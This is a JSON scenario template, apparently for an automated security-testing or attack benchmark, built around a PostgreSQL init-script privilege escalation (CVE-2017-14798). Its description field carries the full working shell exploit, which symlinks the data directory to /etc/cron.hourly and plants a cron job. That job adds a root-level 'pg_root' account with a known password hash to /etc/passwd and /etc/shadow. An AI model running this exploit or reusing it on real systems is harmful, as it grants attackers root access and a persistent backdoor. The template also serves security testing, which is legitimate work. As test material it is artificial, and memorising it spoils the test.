@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_45184",
+  "category": "D3_database",
+  "attack_technique": "T1078.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: PostgreSQL 9.4-0.5.3 - Privilege Escalation (CVE-2017-14798)\n\nExploit source code (45184.sh):\n```\n# Exploit Title: PostgreSQL 9.4-0.5.3 - Privilege Escalation\n# Date: 2017-10-11\n# Exploit Author: Johannes Segitz\n# Vendor Homepage: https://bugzilla.suse.com/show_bug.cgi?id=1062722\n# Software Link: -\n# Version: Before postgresql-init-9.4-0.5.3.1\n# Tested on: SUSE Linux Enterprise 11 SP4\n# CVE : CVE-2017-14798\n\n#!/bin/sh\n\n# don't use spaces or other funny characters in here\nCRON_DIR='/etc/cron.hourly'\nCRON_FILE=\"$CRON_DIR/totally_not_a_lpe\"\n\ndeclare -a CLEANUP_ELEMENTS=('base' 'global' 'pg_clog' 'pg_hba.conf' 'pg_ident.conf' 'pg_multixact' 'pg_subtrans' 'pg_tblspc' 'pg_twophase' 'PG_VERSION' 'pg_xlog' 'postgresql.conf')\n\nif [ \"$(whoami)\" != \"postgres\" ]; then\n  echo \"Must be run as user postgres\"\n  exit -1\nfi\ncd\n\necho setting up exploit\nmv data data2\nln -s $CRON_DIR data\n\necho waiting for DB restart\nwhile [ ! -w $CRON_DIR ]; do\n  sleep 1\ndone\n\necho able to write $CRON_DIR\necho '#!/bin/sh' > $CRON_FILE\necho 'echo '\"'\"'pg_root:x:0:0:,,,:/home/pg_root:/bin/bash'\"'\"' >> /etc/passwd' >> $CRON_FILE\necho 'echo '\"'\"'pg_root:$2y$05$6F6hHGfvZ42Mq1EF8V.e8uguGumaZsZ4P9qfjiuHFT/k8B2CZrJaO:16339:0:99999:7:::'\"'\"' >> /etc/shadow' >> $CRON_FILE\necho \"rm $CRON_FILE\" >> $CRON_FILE\necho \"chown root.root ${CRON_DIR}\" >> $CRON_FILE\nchmod +x $CRON_FILE\n\nif [ -e $CRON_FILE ]; then\n  echo wrote $CRON_FILE\nelse\n  echo failed to write $CRON_FILE, exiting\n  exit 1\nfi\n\necho cleaning up\nfor i in \"${CLEANUP_ELEMENTS[@]}\"; do\n   rm -rf \"$CRON_DIR/$i\"\ndone\nrm data\nmv data2 data\n\necho now wait, depending on CRON_DIR setting you should be able to log into this system with pg_root:foobar soonish. Enjoy!\n```",
+  "cve": "CVE-2017-14798",
+  "exploitdb_id": "45184",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_45184",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
